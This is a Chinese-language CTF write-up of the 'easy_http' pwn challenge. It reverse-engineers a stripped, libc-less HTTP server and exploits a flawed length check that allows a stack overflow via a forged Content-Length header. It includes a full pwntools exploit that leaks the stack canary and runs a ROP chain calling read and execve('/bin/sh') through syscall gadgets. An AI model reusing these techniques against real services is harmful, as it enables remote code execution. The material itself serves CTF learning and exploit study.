# 春秋杯冬季赛day2 easy_http复现-先知社区

> **来源**: https://xz.aliyun.com/news/16600  
> **文章ID**: 16600

---

这个题比较恶心的地方有两个，第一个是这个题没有libc，把所有libc的函数自己重写了一下，符号表全部抹掉了，所以有很大的逆向难度，第二个是这个题有很多进程，多进程调试也是比较繁琐的一个点，看过官方题解后，发现漏洞点本身其实是比较简单的，就是逆向难度确实比较大，ida有些地方反编译的也跟狗屎一样，所以这里我从一个做题者看ida的角度来分析这道题

### 题目分析

![](images/20250211172416-f715f164-e859-1.png)

iot类型的题目，3成靠看，7成靠猜，这里猜测if里面的函数应该是某个检查，核心应该是红框里的函数

![](images/20250211172417-f761d0fa-e859-1.png)

主体长这样，第16行的函数一开始乍一看比较烦，不太想看，所以先看的是17行的getmessagefromheader函数（我修改过函数名）

![](images/20250211172417-f798ec7a-e859-1.png)

映入眼帘的POST，GET，HTTP/1.1，所以很明显这个函数就是根据请求头提取数据的，原理就是字符串匹配，findthroughword函数也是我自己命名的，大概意思就是根据第二个参数查找第一个参数里有没有这个字符串，长度是第三个参数，不存在则返回真，这里的逻辑也不难逆向，知道这个函数在干什么的话就比较简单的

![](images/20250211172417-f7d2ec74-e859-1.png)

后面的逻辑也就很简单了，根据字符串匹配找到host，content，content-length，并把这些值赋值给一个全局变量，后面访问也是直接访问全局变量，返回值就是是否同时找到了host，content，content-length

据此我们不难得出输入数据的格式如下

```
template = '''POST /{} HTTP/1.1\r
Host: www.baidu.com\r
User-Agent: Haha\r
Content-Length: {}\r
Content: {}\r
'''
```

![](images/20250211172418-f7fab150-e859-1.png)

![](images/20250211172418-f82c8234-e859-1.png)

接下来这个函数一看就是返回响应头，最后经过调试发现15行的函数会导致进程结束退出

接着进入下一个函数，这里面ida反编译的就相当烂了，所以我们需要利用动态调试，这里动态调试其实也是一个难点，所以先讲一下这个题应该怎么动态调试吧，反正这个题我尝试用set follow-fork-mode parent也没啥鸟用，我也不知道为什么，不过在花神的指点下，我了解了一种方法，并将他的方法加以改进，写成了一段脚本（调教AI写的，但是好用的）

```
def debug():
    command = ["ps", "-ax"]
    grep_command = ["grep", "attachment"]
    # 执行 ps 命令
    ps_process = subprocess.Popen(command, stdout=subprocess.PIPE)
    # 将 ps 命令的输出作为 grep 命令的输入
    grep_process = subprocess.Popen(grep_command, stdin=ps_process.stdout, stdout=subprocess.PIPE)
    # 允许 ps 命令的输出流直接传递到 grep 命令
    ps_process.stdout.close()
    # 获取最终输出
    output = grep_process.communicate()[0]
    # 输出结果
    pid=int(output.decode().split(' ')[14],10)
    attach(pid)
    pause()
```

一开始花神给我的脚本是这样的

```
def debug():
    pid = util.proc.pidof(io)[0] + 1
    attach(pid)
```

但可能是由于我的环境问题吧，pid = util.proc.pidof(io)[0] 我print出来是空的，所以只能用前面的那个办法，简单来说就是利用“ps -ax | grep attachment”这个命令得到子进程的进程号，然后打开这个进程，并且这个方法适用于后续打开的所有进程，花神那个貌似只能用于调试第一个子进程。

![](images/20250211172418-f85cc764-e859-1.png)

![](images/20250211172419-f897ee18-e859-1.png)

映入眼帘的是这个画红框的函数，根据调试，观察前后返回值rax的变化，以及伪代码的一些特征，我们大致可以把它看成strlen函数，由此可知v12就是在检查content的长度是否小于0xf0，下面24行的那个函数调试过程中确实没看出来是个啥，大概就是个赋值函数，但是赋的值也挺奇怪的，不过后面也没太用到

![](images/20250211172419-f8ea4fda-e859-1.png)

![](images/20250211172420-f938fba8-e859-1.png)

接着就是这个if判断条件，漏洞也就是在这，不过这个v10数组真的很抽象，莫名其妙的，很明显就是ida反编译的不好，所以我们还是要动态调试看一看他到底指向了什么

先来看一下我们第一次发送的payload是什么

![](images/20250211172420-f96c7d18-e859-1.png)

![](images/20250211172420-f99447d8-e859-1.png)

![](images/20250211172421-f9db867a-e859-1.png)

这里判断rax和contentlength的关系，对应的是第25行的判断，所以v10[0]对应的是length，接着v10[1]就比较迷惑，调试发现他是1，应该是个标志位

![](images/20250211172421-fa19965e-e859-1.png)

我们到ida里找找到底哪里给rbp-0x14c这个位置赋值了

![](images/20250211172422-fa731440-e859-1.png)

发现这里其实是在调用完strlen(host)之后进行的赋值，而ida里长这样

![](images/20250211172422-faa7c8de-e859-1.png)

就很莫名其妙，所以这里正确的反编译应该是

v10[1]=stelen(host)<=0x2f

因此v10[1]是一个判断host长度是否合规的标志

v12也是判断长度的，他跟lengthtag的区别就在于，v12直接通过strlen获得content的长度，而v10[0]是根据我们输入的content-length来获得长度，二者可以不一样哦，取决于我们的content-length是否进行伪造。

所以漏洞点就在于他这里错误的使用了“||”作为判断条件，使得我们只需要满足上述一个条件即可，由此可以伪造contentlength导致栈溢出，之所以导致了栈溢出请继续往下看

![](images/20250211172422-fac0bf1a-e859-1.png)

接着来动态调试这个函数，关注rdi，rsi和rdx

![](images/20250211172423-fb0c52a4-e859-1.png)

![](images/20250211172423-fb641dfe-e859-1.png)

发现rdi变成了原先rsi的内容，由此猜测这个函数实现了类似memcpy的功能，那么v13，v14都是栈上的东西，由此就可以实现栈溢出了。

后面的增删改查其实是迷惑项，一点用也没有（其实也有一点用，show可以把canary show出来），因为每次都会开一个新的进程

![](images/20250211172424-fba5b322-e859-1.png)

show的是v14，根据刚才分析，也就是content的内容，于是我们可以利用这个地方把canary泄露出来

![](images/20250211172424-fbeec56c-e859-1.png)

### 利用方法

v14在栈上的位置如上，所以我们第一段payload可以这样构造

![](images/20250211172425-fc1e8aa4-e859-1.png)

由此把canary低位的\x00覆盖为‘a’，从而把canary拽出来

有了canary，我们就可以覆盖返回地址，打rop了，不过本题没有libc，故泄露libc的方法没有用了，只能打syscall了

在bss上写下/bin/sh，方便我们后续调用execve

构造payload如下

![](images/20250211172425-fc526868-e859-1.png)

注意最后一定要加b'
\
'，否则格式会有问题程序会死掉

![](images/20250211172425-fc9e8b98-e859-1.png)

![](images/20250211172426-fcdef746-e859-1.png)

成功覆盖ret地址

然而接下来的调试过成中发现

![](images/20250211172426-fd2ac412-e859-1.png)

在匹配路径时会用到栈上的一个地址，而这个地址被我们覆盖成了rop，所以为了能够正常的找到路径，我们需要把这里绕过，方法就是用一个长一点的pop

![](images/20250211172427-fd83f690-e859-1.png)

这样就正常了

最后附上exp和成功截图

```
from pwnplus import *
import subprocess


context.log_level='debug'
context.arch = 'amd64'
p=mypwn('./attachment')
elf=ELF('./attachment')

def debug():
    command = ["ps", "-ax"]
    grep_command = ["grep", "attachment"]
    # 执行 ps 命令
    ps_process = subprocess.Popen(command, stdout=subprocess.PIPE)
    # 将 ps 命令的输出作为 grep 命令的输入
    grep_process = subprocess.Popen(grep_command, stdin=ps_process.stdout, stdout=subprocess.PIPE)
    # 允许 ps 命令的输出流直接传递到 grep 命令
    ps_process.stdout.close()
    # 获取最终输出
    output = grep_process.communicate()[0]
    # 输出结果
    # print(output.decode())
    pid=int(output.decode().split(' ')[14],10)
    attach(pid)
    pause()

template = '''POST /{} HTTP/1.1\r
Host: www.baidu.com\r
User-Agent: Haha\r
Content-Length: {}\r
Content: {}\r
'''

payload1=template.format("show", 0x109, 'a'*0x109)


p.sd(payload1)
p.rcvu(b'a'*0x109)
canary=p.canary()
print('canary:',hex(canary))

'''
.text:0000000000458875                 syscall                 ; LINUX - sys_write
.text:0000000000458877                 cmp     rax, 0FFFFFFFFFFFFF000h
.text:000000000045887D                 ja      short loc_4588D0
.text:000000000045887F                 retn
'''

bssaddr=0x0000000004E8470
syscall=0x0000000000458875
pop_rdi=0x000000000040297f
pop_rsi=0x000000000040a9ee
pop_rax_rdx_rbx=0x00000000004a4c4a
pop_r12_r13_r14_r15_rbp=0x000000000040545d
payload2=p64(pop_r12_r13_r14_r15_rbp)+(b'a'*0x15 + b'/add\x00').ljust(0x28, b'a')
payload2+=p64(pop_rdi)+p64(0)
payload2+=p64(pop_rsi)+p64(bssaddr)
payload2+=p64(pop_rax_rdx_rbx)+p64(0)#read
payload2+=p64(0x200)+p64(0)
payload2+=p64(syscall)+p64(pop_rdi)
payload2+=p64(bssaddr)+p64(pop_rsi)
payload2+=p64(0)+p64(pop_rax_rdx_rbx)
payload2+=p64(59)+p64(0)#execve('/bin/sh',0,0)
payload2+=p64(0)+p64(syscall)
payload2=b'''POST /add HTTP/1.1\r
Host: www.baidu.com\r
User-Agent: Haha\r
Content-Length: 768\r
Content: '''+b'a'*0x108+p64(canary)+p64(0)+payload2+b'\r
'
# debug()
p.sd(payload2)
p.sd(b'/bin/sh\0')

p.ia()
```

![](images/20250211172427-fdc7c9c6-e859-1.png)
